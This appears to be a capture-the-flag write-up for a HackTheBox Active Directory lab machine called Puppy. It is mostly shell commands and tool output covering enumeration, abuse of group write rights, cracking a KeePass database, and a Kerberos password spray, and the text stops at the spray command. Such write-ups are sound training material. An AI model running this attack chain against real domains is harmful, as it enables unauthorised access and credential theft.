---
render_with_liquid: false
title: HackTheBox Writeup - Puppy
date: 2025-05-19 23:40:08 +1400
tags: [hackthebox, nmap, windows, ad, netexec, bloodhound-ce, bloodhound-python, bloodhound-cli, ldeep, bloodyad, smb, dacl-abuse, keepass4, keepass2john, john, keepass2json, password-spraying, pass-the-ticket, evil-winrm, reverse-ssh, runascs, discover-backup, dpapi, dpapi-py, dcsync, impacket, ntds]
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/6a127b39657062e42c1a8dfdcd23475d.png
    width: 640
    height: 480
---



Analytics is an medium difficulty Active Directory machine. Starting by DACL abuse to cracking keepass database, brute force gathered passwords on enabled domain users to gain access as `ant.edwards`, abuse DACL to gain WINRM access as `adam.silver`, discovered credentials from backup files for password spray to gain access as `steph.cooper`, discovered the domain admin `steph.cooper`'s stored credential by harvesting DPAPI secrets, obtained `administrator`'s NT Hash via DCSync attack.


# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ pt init '10.10.11.70 DC.PUPPY.HTB DC PUPPY.HTB'
+---------+--------+-------------+--------------+
| PROFILE | STATUS |     IP      |    DOMAIN    |
+---------+--------+-------------+--------------+
| puppy   | on     | 10.10.11.70 | DC.PUPPY.HTB |
| puppy   | on     | 10.10.11.70 | DC           |
| puppy   | on     | 10.10.11.70 | PUPPY.HTB    |
+---------+--------+-------------+--------------+

╒═══════════╤══════════════╤══════════════╤═══════════╤═════════════╤═══════╤═══════════╤══════════════╤════════════╤══════════════════╕
│ profile   │ lhost        │ rhost        │ domain    │ ip          │ url   │ dc_name   │ dc_fqdn      │ user       │ pass             │
╞═══════════╪══════════════╪══════════════╪═══════════╪═════════════╪═══════╪═══════════╪══════════════╪════════════╪══════════════════╡
│ puppy     │ 10.10.14.126 │ DC.PUPPY.HTB │ PUPPY.HTB │ 10.10.11.70 │       │ PUPPY.HTB │ PUPPY.HTB.DC │ levi.james │ KingofAkron2025! │
╘═══════════╧══════════════╧══════════════╧═══════════╧═════════════╧═══════╧═══════════╧══════════════╧════════════╧══════════════════╛
```

## Nmap

```bash
# Nmap 7.95 scan initiated Mon May 19 23:40:07 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389,49664,49667,49668,49670,49688,61971, 10.10.11.70
Nmap scan report for 10.10.11.70
Host is up, received user-set (0.084s latency).
Scanned at 2025-05-19 23:40:08 CST for 504s

Bug in iscsi-info: no string output.
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-22 10:58:00Z)
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2049/tcp  open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3260/tcp  open  iscsi?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61971/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-22T11:05:32
|_  start_date: N/A
|_clock-skew: 2d19h17m44s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62785/tcp): CLEAN (Timeout)
|   Check 2 (port 47994/tcp): CLEAN (Timeout)
|   Check 3 (port 26380/udp): CLEAN (Timeout)
|   Check 4 (port 46192/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 19 23:48:32 2025 -- 1 IP address (1 host up) scanned in 504.97 seconds
```


## 445 - SMB


### Auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ nxc smb $(pt get rhost) -u '' -p ''
nxc smb $(pt get rhost) -u 'a' -p ''
nxc smb $(pt get rhost) -u 'Guest' -p ''
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\:
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\a: STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Guest: STATUS_ACCOUNT_DISABLED
```


### Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ nxc smb $(pt get rhost) -u '' -p '' --shares
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\:
SMB         10.10.11.70     445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```


### Groups & Users

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ /opt/sectools/ad/enum4linux-ng/enum4linux-ng.py -oA enum/enum4linux -R 1000 -r '500-1000,1000-5000' -U -G -Gm -C -P -L -I -N $(pt get rhost) -u '' -p ''
ENUM4LINUX - next generation (v1.3.4)
[...]

 ===================================================
|    Domain Information via RPC for DC.PUPPY.HTB    |
 ===================================================
[+] Domain: PUPPY
[+] Domain SID: S-1-5-21-1487982659-1829050783-2281216199
[+] Membership: domain member
[...]
 ==================================================================
|    Users, Groups and Machines on DC.PUPPY.HTB via RID Cycling    |
 ==================================================================
[*] Trying SID S-1-5-21-1487982659-1829050783-2281216199
[-] Could not find any (new) users, (new) groups or (new) machines
[...]
```


# User Flag
---

## Auth as levi.james


### Assumed breach scenario

![](/assets/obsidian/feae523d25f7222e261d214c783b6810.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ pt set user 'levi.james'; pt set pass 'KingofAkron2025!'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
levi.james:KingofAkron2025!

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ nxc smb $(pt get rhost) -k -u "$(pt get user)" -p "$(pt get pass)"
SMB         DC.PUPPY.HTB    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         DC.PUPPY.HTB    445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
```


## Auth as ant.edwards


### Configurations for AD

Sync time with DC for kerberos operations

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ sudo ~/scripts/ad/sync_ntp.sh $(pt get ip)
[*] Disable virtualbox's auto time sync
-> sudo /etc/init.d/virtualbox-guest-utils stop
Stopping virtualbox-guest-utils (via systemctl): virtualbox-guest-utils.service.

[*] Stop systemd-timesyncd to sync Time manually
-> sudo systemctl stop systemd-timesyncd

[*] Disable system time sync
-> sudo systemctl disable --now chronyd
Failed to disable unit: Unit chronyd.service does not exist

[*] Sync time with NTP server
-> sudo ntpdate -u $1
2025-05-24 21:36:45.613901 (+0800) +147713.746854 +/- 0.040183 10.10.11.70 s1 no-leap
CLOCK: time stepped by 147713.746854
CLOCK: time changed from 2025-05-23 to 2025-05-24

Done syncing time with NTP server: 10.10.11.70
```

Configure **kerberos**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ pt set dc_name "$(cat .pt/hosts | head -n1 | awk '{print $3}')"; pt set dc_fqdn "$(pt get dc_name).$(pt get domain)"

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ sudo ~/scripts/ad/configure_krb5.py $(pt get domain) $(pt get dc_name)
[*] Configuration Data:
[libdefault]
        default_realm = PUPPY.HTB

[realms]
        PUPPY.HTB = {
                kdc = dc.puppy.htb
                admin_server = dc.puppy.htb
        }

[domain_realm]
        puppy.htb = PUPPY.HTB
        .puppy.htb = PUPPY.HTB

[*] Previous config backed up to /etc/krb5.conf~
[+] /etc/krb5.conf has been configured
```


### Domain Enumeration

#### Bloodhound

Run collectors

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ bloodhound-ce-python -d "$(pt get domain)" -ns $(pt get ip) -c all --zip -u "$(pt get user)" -p "$(pt get pass)"
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 16S
INFO: Compressing output into 20250525233148_bloodhound.zip
```

Start bloodhound

```bash
sudo docker-compose -f /opt/sectools/ad/bloodhound-ce/docker-compose.yml up
```

Quick checks

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ bhcli upload *_bloodhound.zip
INFO: Starting new file upload job...
INFO: Uploading file 20250525233148_bloodhound.zip
INFO: Ending file upload job...
INFO: Now waiting for ingestion being complete...
INFO: Ingestion completed, the data is now available.

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ bhcli stats -d "$(pt get domain)"
┌────────────────────┬─────────┬─────────┐
│ PUPPY.HTB          │   all   │ enabled │
├────────────────────┼─────────┼─────────┤
│ User Accounts      │      10 │       6 │
│ Computer Accounts  │       1 │       1 │
│ Domain Admins      │       1 │       1 │
│ Domain Controllers │       1 │       1 │
│ Protected Users    │       0 │       0 │
│ Groups             │      55 │         │
│ Root CAs           │       0 │         │
│ Enterprise CAs     │       0 │         │
│ Cert Templates     │       0 │         │
└────────────────────┴─────────┴─────────┘

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ bhcli audit -d "$(pt get domain)"
PUPPY.HTB
=========

[*] Interesting privileges for domain users or computers
    0 relations found

[*] Interesting privileges for guests
    0 relations found

[*] Kerberoastable user accounts of high value (enabled, no MSA/gMSA)
    0 accounts found

[*] AS-REP-roastable user accounts (enabled)
    0 accounts found

[*] Accounts trusted for unconstrained delegation (enabled, no DCs)
    0 accounts found

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ bhcli users -d "$(pt get domain)" --description
ADAM.SILVER@PUPPY.HTB
ADMINISTRATOR@PUPPY.HTB Built-in account for administering the computer/domain
ANT.EDWARDS@PUPPY.HTB
GUEST@PUPPY.HTB Built-in account for guest access to the computer/domain
JAMIE.WILLIAMS@PUPPY.HTB
KRBTGT@PUPPY.HTB        Key Distribution Center Service Account
LEVI.JAMES@PUPPY.HTB
NT AUTHORITY@PUPPY.HTB
STEPH.COOPER@PUPPY.HTB
STEPH.COOPER_ADM@PUPPY.HTB
```


#### Ldeep

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ mkdir -p ldeep && ldeep ldap -u "$(pt get user)" -p "$(pt get pass)" -d "$(pt get domain)" -s "ldap://$(pt get rhost)" all ldeep/
[+] Retrieving auth_policies output
[...]
```

By looking through user attributes, we found an interesting attribute called `userParameters` from the user `adam.silver`

![](/assets/obsidian/2c5b6eee54123c6ab0b90462cae56351.png)

`levi.james` is in the `MANPOWER` OU

![](/assets/obsidian/d047eedc236d49aef7c34aa5ff8ddbb0.png)

- Group users by group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ cat ldeep/*_users_all.json | jq 'map(select(.memberOf != null)) | reduce .[] as $item ({}; reduce $item.memberOf[] as $group (.; .[$group] = (.[$group] // []) + [$item.sAMAccountName]))'
{
  "CN=Administrators,CN=Builtin,DC=PUPPY,DC=HTB": [
    "steph.cooper_adm",
    "Administrator"
  ],
  "CN=Remote Management Users,CN=Builtin,DC=PUPPY,DC=HTB": [
    "steph.cooper",
    "adam.silver"
  ],
  "CN=DEVELOPERS,DC=PUPPY,DC=HTB": [
    "jamie.williams",
    "adam.silver",
    "ant.edwards"
  ],
  "CN=SENIOR DEVS,CN=Builtin,DC=PUPPY,DC=HTB": [
    "ant.edwards"
  ],
  "CN=HR,DC=PUPPY,DC=HTB": [
    "levi.james"
  ],
  "CN=Denied RODC Password Replication Group,CN=Users,DC=PUPPY,DC=HTB": [
    "krbtgt"
  ],
  "CN=Guests,CN=Builtin,DC=PUPPY,DC=HTB": [
    "Guest"
  ],
  "CN=Group Policy Creator Owners,CN=Users,DC=PUPPY,DC=HTB": [
    "Administrator"
  ],
  "CN=Domain Admins,CN=Users,DC=PUPPY,DC=HTB": [
    "Administrator"
  ],
  "CN=Enterprise Admins,CN=Users,DC=PUPPY,DC=HTB": [
    "Administrator"
  ],
  "CN=Schema Admins,CN=Users,DC=PUPPY,DC=HTB": [
    "Administrator"
  ]
}
```


### User access check


#### AD

- `LEVI.JAMES` has write access to `DEVELOPERS` group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=PUPPY,DC=HTB
permission: WRITE

distinguishedName: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
permission: WRITE

distinguishedName: CN=DEVELOPERS,DC=PUPPY,DC=HTB
permission: WRITE
```


#### SMB Shares

There's a `DEV` SMB share with description : `DEV-SHARE for PUPPY-DEVS`, maybe users in `DEVELOPERS` group have permission to access it

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" -M spider_plus --smb-timeout 10 --log nxc_shares.log -k
SMB         DC.PUPPY.HTB    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         DC.PUPPY.HTB    445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         DC.PUPPY.HTB    445    DC               [*] Enumerated shares
SMB         DC.PUPPY.HTB    445    DC               Share           Permissions     Remark
SMB         DC.PUPPY.HTB    445    DC               -----           -----------     ------
SMB         DC.PUPPY.HTB    445    DC               ADMIN$                          Remote Admin
SMB         DC.PUPPY.HTB    445    DC               C$                              Default share
SMB         DC.PUPPY.HTB    445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         DC.PUPPY.HTB    445    DC               IPC$            READ            Remote IPC
SMB         DC.PUPPY.HTB    445    DC               NETLOGON        READ            Logon server share
SMB         DC.PUPPY.HTB    445    DC               SYSVOL          READ            Logon server share
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/DC.PUPPY.HTB.json".
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] SMB Shares:           6 (ADMIN$, C$, DEV, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] Total folders found:  27
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] Total files found:    10
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] File size average:    1.05 KB
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] File size min:        0 B
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] File size max:        4.28 KB
```


### DACL Abuse - Write access to group : DEVELOPERS

Add `LEVI.JAMES` to `DEVELOPERS` group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k add groupMember 'DEVELOPERS' 'LEVI.JAMES'
[+] LEVI.JAMES added to DEVELOPERS
```


### 445 - SMB : Shares

Enumerate SMB shares again

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" -M spider_plus --smb-timeout 10 --log nxc_shares.log -k
SMB         DC.PUPPY.HTB    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         DC.PUPPY.HTB    445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         DC.PUPPY.HTB    445    DC               [*] Enumerated shares
SMB         DC.PUPPY.HTB    445    DC               Share           Permissions     Remark
SMB         DC.PUPPY.HTB    445    DC               -----           -----------     ------
SMB         DC.PUPPY.HTB    445    DC               ADMIN$                          Remote Admin
SMB         DC.PUPPY.HTB    445    DC               C$                              Default share
SMB         DC.PUPPY.HTB    445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         DC.PUPPY.HTB    445    DC               IPC$            READ            Remote IPC
SMB         DC.PUPPY.HTB    445    DC               NETLOGON        READ            Logon server share
SMB         DC.PUPPY.HTB    445    DC               SYSVOL          READ            Logon server share
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/DC.PUPPY.HTB.json".
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] SMB Shares:           6 (ADMIN$, C$, DEV, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] SMB Readable Shares:  4 (DEV, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] Total folders found:  28
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] Total files found:    12
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] File size average:    2.73 MB
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] File size min:        0 B
SPIDER_PLUS DC.PUPPY.HTB    445    DC               [*] File size max:        32.8 MB
```

There's an interesting file `recovery.kdbx` in `DEV` share

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ cat "/tmp/nxc_hosted/nxc_spider_plus/$(pt get rhost).json" | jq -r 'to_entries[] | .key as $top_level | .value | to_entries[]? | select(.value | type == "object") | {file_path: ($top_level + "/" + .key), atime: (.value.atime_epoch // "N/A"), size: (.value.size // "N/A")}' | jq -s -r 'sort_by(.atime)[] | [.file_path, .atime, .size] | @tsv' | column -t -s $'\t'
SYSVOL/PUPPY.HTB/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  2025-02-19 19:45:13  1.07 KB
SYSVOL/PUPPY.HTB/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI                                           2025-02-19 19:49:00  22 B
SYSVOL/PUPPY.HTB/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol                              2025-02-19 19:49:00  2.72 KB
DEV/recovery.kdbx                                                                                                  2025-03-12 10:25:46  2.61 KB
SYSVOL/UltFsQYRGg.txt                                                                                              2025-03-21 13:33:44  0 B
DEV/KeePassXC-2.7.9-Win64.msi                                                                                      2025-03-23 15:09:12  32.8 MB
SYSVOL/PUPPY.HTB/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Registry.pol                              2025-05-13 07:50:46  984 B
SYSVOL/PUPPY.HTB/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/comment.cmtx                              2025-05-13 07:50:46  554 B
SYSVOL/PUPPY.HTB/Policies/{841B611C-9F3B-4090-BA0C-2AE4D6C02AF8}/GPT.INI                                           2025-05-14 07:48:05  59 B
SYSVOL/PUPPY.HTB/Policies/{841B611C-9F3B-4090-BA0C-2AE4D6C02AF8}/Machine/Registry.pol                              2025-05-14 07:48:05  888 B
SYSVOL/PUPPY.HTB/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI                                           2025-05-15 00:53:36  23 B
SYSVOL/PUPPY.HTB/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  2025-05-15 00:53:36  4.28 KB
```


### Crack keepass database

Download `DEV/recovery.kdbx`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ smbclient -U "$(pt get domain)\\$(pt get user)%$(pt get pass)" "//$(pt get ip)/DEV" -c 'lcd loot; prompt OFF; get recovery.kdbx'
getting file \recovery.kdbx of size 2677 as recovery.kdbx (8.1 KiloBytes/sec) (average 8.1 KiloBytes/sec)
```

Got an error `File version '40000' is currently not supported!` while trying to extract the password hash of `recovery.kdbx`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ keepass2john loot/recovery.kdbx
! loot/recovery.kdbx : File version '40000' is currently not supported!
```

A simple google search showed that we need to use the latest version of **john**

> https://github.com/openwall/john/issues/5775

Download and build the latest version of **john**

```bash
cd /opt/sectools/password-attacks/Cracking
git clone https://github.com/openwall/john
cd john/src
./configure && make
```

Extract the password hash again

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ /opt/sectools/password-attacks/Cracking/john/run/keepass2john loot/recovery.kdbx | tee loot/recovery.kdbx.hash
recovery:$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf2662853527714*d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb92441470*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf266285352771407100000000ab56ae17c5cebf440092907dac20a350b8b00000000014205000000245555494410000000ef636ddf8c29444b91f7a9a403e30a0c05010000004908000000250000000000000005010000004d080000000000000400000000040100000050040000000400000042010000005320000000d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb9244147004010000005604000000130000000000040000000d0a0d0a*31614848015626f2451cc4d07ce9a281a416c8e8c2ff8cc45c69ce1f4daef0e9
```

> **hashcat** failed to recognize the hash, we can see that keepassv4 hashes are not yet supported from [example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
> 
> ```bash
> ┌──(bravosec㉿fsociety)-[~/htb/Puppy]
> └─$ hashcat loot/recovery.kdbx.hash /opt/wordlists/rockyou.txt --user
> hashcat (v6.2.6) starting in autodetect mode
> 
> OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
> ============================================================================================================================================
> * Device #1: cpu-haswell-AMD Ryzen 5 5600X 6-Core Processor, 7215/14495 MB (2048 MB allocatable), 4MCU
> 
> No hash-mode matches the structure of the input hash.
> 
> Started: Mon May 26 00:41:16 2025
> Stopped: Mon May 26 00:41:17 2025
> ```
{: .prompt-danger }

Use **john** and fall back utilizing the CPU power instead

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ /opt/sectools/password-attacks/Cracking/john/run/john --wordlist=/opt/wordlists/rockyou.txt loot/recovery.kdbx.hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 256/256 AVX2])
Cost 1 (t (rounds)) is 37 for all loaded hashes
Cost 2 (m) is 65536 for all loaded hashes
Cost 3 (p) is 4 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Failed to use huge pages (not pre-allocated via sysctl? that's fine)
liverpool        (recovery)
1g 0:00:00:10 DONE (2025-05-26 00:43) 0.09225g/s 3.321p/s 3.321c/s 3.321C/s purple..liverpool
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


### Harvest keepass database

I prefer dumping data into json format for analyzation

- Google : `keepass database to json`

> https://gist.github.com/monperrus/578395c30667581677d1ec20b7d445de

Download the script then use [uv](https://github.com/astral-sh/uv) to manage python virtual environment

```bash
cd /opt/sectools/harvesting/
mkdir keepass-to-json
cd keepass-to-json
wget https://gist.githubusercontent.com/monperrus/578395c30667581677d1ec20b7d445de/raw/2b06d6fc50ca6e3452d3f69d88ddaf6902d799f9/export-keepass-to-bitwarden-json.py
uv add --script export-keepass-to-bitwarden-json.py pykeepass
```

Convert the database into a json file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ uv run /opt/sectools/harvesting/keepass-to-json/export-keepass-to-bitwarden-json.py loot/recovery.kdbx
Password:

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ mv /tmp/bitwarden.json ./loot/recovery.kdbx.json
```

Extract to `user:pass` combo list

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ cat loot/recovery.kdbx.json | jq '.items[].login|.username+":"+.password' -r | tee loot/recovery.kdbx.combo
:JamieLove2025!
:HJKL2025!
:Antman2025!
:Steve2025!
:ILY2025!
```


### 88 - Kerberos : Password brute force

Extract all passwords

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ cat loot/recovery.kdbx.combo | awk -F: '{print $NF}' > pass.txt
```

Start **kerberos pre-auth** password spray

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ nxc ldap -k $(pt get dc_fqdn) --log nxc_kerberos.log -u ldeep/_users_enabled.lst -p pass.txt --continue-on-success
